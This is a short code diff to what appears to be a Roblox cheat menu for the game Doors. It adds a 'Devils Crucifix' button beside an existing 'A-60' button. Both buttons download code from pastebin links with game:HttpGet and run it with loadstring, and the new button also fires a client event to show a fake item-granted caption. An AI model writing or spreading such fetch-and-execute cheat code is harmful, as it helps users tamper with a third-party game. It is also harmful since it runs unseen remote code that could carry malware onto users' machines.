@@ -140,3 +140,8 @@ end)
 MainSection:NewButton("A-60", "Beta", function()
     loadstring(game:HttpGet("https://pastebin.com/raw/SNNPjAyq"))()  
 end)
+
+MainSection:NewButton("Devils Crucifix", "Beta", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/GUBcLuAC"))() 
+firesignal(game.ReplicatedStorage.Bricks.Caption.OnClientEvent, "The Devil's Crucifix Has Been Given!")
+end)
